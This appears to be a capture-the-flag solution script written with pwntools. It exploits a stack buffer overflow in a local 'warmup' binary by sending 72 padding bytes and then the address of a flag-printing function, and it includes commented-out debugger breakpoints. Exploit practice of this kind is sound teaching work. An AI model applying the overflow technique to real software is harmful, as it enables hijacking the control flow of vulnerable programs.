from pwn import *
context.terminal = ['tmux', 'splitw', '-h']

p = process('./warmup')
#gdb.attach(p,'break *main')
#p = gdb.debug('./warmup', '''
#break *main
#break *0x000000000040069e
#break *0x00000000004006a4
#''')

flag = 0x40060d

buf = ""
buf += "A" * 72
buf += p64(flag)


p.recv()
p.sendline(buf)
p.interactive()
